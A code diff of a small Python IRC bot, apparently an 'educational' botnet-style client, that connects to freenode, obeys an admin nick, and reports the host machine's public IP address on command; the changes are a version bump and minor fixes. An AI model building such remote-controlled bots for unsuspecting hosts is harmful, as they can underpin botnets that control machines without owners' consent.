@@ -24,7 +24,7 @@
 
 NOTICE = 'THIS BOT IS FOR EDUCATION PURPOSES ONLY! DO NOT USE IT FOR MALICIOUS INTENT!'
 author = 'Stephen Harris (trackmastersteve@gmail.com)'
-version = '0.1.6'
+version = '0.1.7'
 last_modification = '2018.08.16'
 
 import ssl
@@ -41,7 +41,6 @@ server = "chat.freenode.net" # Server
 port = 6697 # Port (If you want to use standard 6667, comment out the appropriate line down below to turn off SSL.)
 channel = "#channel" # Channel
 botnick = "botnick" # Your bots IRC nick (If you want to set this manually, comment out the line below to disable ip-to-nick.)
-#botnick = ip.replace(".", "-") # Set botnick to ip address.
 botident = "password" # Bots NickServ password
 adminname = "master" # Your IRC nick
 exitcode = "bye " + botnick
@@ -53,7 +52,7 @@ ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ircsock = ssl.wrap_socket(ircsock) # Comment this line out if you don't want to use SSL.
 ircsock.connect((server, port)) # Here we connect to the server.
 ircsock.send(bytes("USER "+ botnick +" "+ botnick +" "+ botnick +" "+ botnick + " " + botnick + "\n", "UTF-8")) # We are basically filling out a form with this line and saying to set all the fields to the bot nickname.
-botnick = ip.replace(".", "-")
+#botnick = ip.replace(".", "-")
 ircsock.send(bytes("NICK "+ botnick +"\n", "UTF-8")) # Assign the nick to the bot.
 
 def joinchan(chan): # Join channel(s).
@@ -115,7 +114,7 @@ def main():
                 # Respond to .ip command from admin.
                 if name.lower() == adminname.lower() and message.find('.ip') != -1:
                     sendmsg("My public ip address is:", name)
-                    sendmsg(format(ip()), name)
+                    sendmsg(format(ip), name)
                 
                 # Respond to .uptime command from admin.
                 if name.lower() == adminname.lower() and message.find('.uptime') != -1:
